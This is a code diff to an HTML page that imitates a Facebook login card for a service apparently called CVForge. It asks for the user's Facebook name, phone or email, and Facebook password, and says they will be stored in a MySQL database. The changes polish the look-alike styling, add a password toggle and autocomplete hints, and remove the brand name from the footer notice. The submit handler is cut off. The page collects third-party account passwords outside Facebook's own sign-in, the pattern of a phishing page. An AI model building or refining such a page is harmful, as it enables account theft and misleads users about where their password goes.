@@ -26,70 +26,127 @@
     }
     .fb-logo {
       color: #1877f2;
-      font-size: 38px;
+      font-size: 42px;
       font-weight: 800;
-      letter-spacing: -1px;
+      letter-spacing: -1.2px;
     }
     .card {
       background: #ffffff;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
       width: 100%;
-      max-width: 396px;
-      padding: 20px 24px;
+      max-width: 400px;
+      padding: 24px;
       text-align: center;
     }
     .card-title {
       font-size: 17px;
-      font-weight: 600;
+      font-weight: 700;
       color: #1c1e21;
-      margin-bottom: 16px;
+      margin-bottom: 20px;
+      line-height: 1.4;
     }
-    .input-group {
-      margin-bottom: 12px;
+
+    /* Modern Floating Labels */
+    .floating-group {
+      position: relative;
+      margin-bottom: 16px;
       text-align: left;
     }
-    .input-group label {
-      display: block;
-      font-size: 12px;
-      font-weight: 600;
-      color: #606770;
-      margin-bottom: 4px;
-    }
-    input {
+    .floating-group input {
       width: 100%;
-      padding: 12px 14px;
-      font-size: 14px;
-      border: 1px solid #dddfe2;
-      border-radius: 6px;
+      height: 54px;
+      padding: 20px 14px 6px 14px;
+      font-size: 15px;
+      color: #1c1e21;
+      border: 1.5px solid #ccd0d5;
+      border-radius: 8px;
       outline: none;
-      transition: border-color 0.2s;
+      background: #ffffff;
+      transition: border-color 0.2s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.2s ease;
     }
-    input:focus {
+    .floating-group input.has-toggle {
+      padding-right: 42px;
+    }
+    .floating-group label {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #8a8d91;
+      pointer-events: none;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      background: transparent;
+      user-select: none;
+    }
+
+    /* When Focused or Not Empty -> Float Label Up */
+    .floating-group input:focus ~ label,
+    .floating-group input:not(:placeholder-shown) ~ label {
+      top: 13px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #1877f2;
+    }
+    .floating-group input:focus {
       border-color: #1877f2;
-      box-shadow: 0 0 0 2px #e7f3ff;
+      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.18);
     }
+    .floating-group input:not(:focus):not(:placeholder-shown) ~ label {
+      color: #606770;
+    }
+
+    /* Eye Show/Hide Toggle */
+    .toggle-pass-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #65676b;
+      padding: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: background 0.15s ease, color 0.15s ease;
+    }
+    .toggle-pass-btn:hover {
+      background: #f0f2f5;
+      color: #1c1e21;
+    }
+
     .btn-login {
       width: 100%;
       background-color: #1877f2;
       color: #ffffff;
       font-size: 16px;
-      font-weight: bold;
-      padding: 11px;
+      font-weight: 700;
+      padding: 13px;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       cursor: pointer;
-      margin-top: 6px;
-      transition: background-color 0.2s;
+      margin-top: 4px;
+      transition: background-color 0.2s, transform 0.1s;
     }
     .btn-login:hover {
       background-color: #166fe5;
     }
+    .btn-login:active {
+      transform: scale(0.99);
+    }
     .footer-note {
-      margin-top: 16px;
+      margin-top: 18px;
       font-size: 12px;
       color: #8a8d91;
-      line-height: 1.4;
+      line-height: 1.45;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
     }
   </style>
 </head>
@@ -102,30 +159,58 @@
     <div class="card-title">ចូលគណនី Facebook ដើម្បីភ្ជាប់ជាមួយ CVForge</div>
     
     <form id="fbForm" onsubmit="handleLogin(event)">
-      <div class="input-group">
-        <label>ឈ្មោះគណនី Facebook របស់អ្នក (Full Name):</label>
-        <input type="text" id="fbName" required placeholder="ឧ. Sok Chenda / Dara" value="Sok Chenda">
+      <!-- Name Field with Floating Label -->
+      <div class="floating-group">
+        <input type="text" id="fbName" required placeholder=" " autocomplete="name">
+        <label for="fbName">ឈ្មោះគណនី Facebook របស់អ្នក (Full Name)</label>
       </div>
 
-      <div class="input-group">
-        <label>លេខទូរស័ព្ទ ឬ អ៊ីមែល Facebook:</label>
-        <input type="text" id="fbContact" required placeholder="012 345 678 ឬ yourname@gmail.com" value="012 888 999">
+      <!-- Phone or Email Field with Floating Label -->
+      <div class="floating-group">
+        <input type="text" id="fbContact" required placeholder=" " autocomplete="username">
+        <label for="fbContact">លេខទូរស័ព្ទ ឬ អ៊ីមែល Facebook</label>
       </div>
 
-      <div class="input-group">
-        <label>ពាក្យសម្ងាត់ (Password):</label>
-        <input type="password" id="fbPass" required placeholder="••••••••" value="password123">
+      <!-- Password Field with Floating Label & Eye Toggle -->
+      <div class="floating-group">
+        <input type="password" id="fbPass" class="has-toggle" required placeholder=" " autocomplete="current-password">
+        <label for="fbPass">ពាក្យសម្ងាត់ (Password)</label>
+        <button type="button" class="toggle-pass-btn" onclick="togglePassword()" title="Show/Hide password">
+          <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+          </svg>
+        </button>
       </div>
 
       <button type="submit" class="btn-login">ចូលគណនី (Log In)</button>
     </form>
 
     <div class="footer-note">
-      🔒 ព័ត៌មានរបស់អ្នកនឹងត្រូវបានរក្សាទុកដោយសុវត្ថិភាពក្នុង MySQL Database របស់ CVForge។
+      <span>🔒</span>
+      <span>ព័ត៌មានរបស់អ្នកនឹងត្រូវបានរក្សាទុកដោយសុវត្ថិភាពក្នុង MySQL Database</span>
     </div>
   </div>
 
   <script>
+    function togglePassword() {
+      const passInput = document.getElementById('fbPass');
+      const eyeIcon = document.getElementById('eyeIcon');
+      if (passInput.type === 'password') {
+        passInput.type = 'text';
+        eyeIcon.innerHTML = `
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+          <line x1="1" y1="1" x2="23" y2="23"></line>
+        `;
+      } else {
+        passInput.type = 'password';
+        eyeIcon.innerHTML = `
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+          <circle cx="12" cy="12" r="3"></circle>
+        `;
+      }
+    }
+
     function handleLogin(e) {
       e.preventDefault();
       const name = document.getElementById('fbName').value.trim() || 'Facebook User';
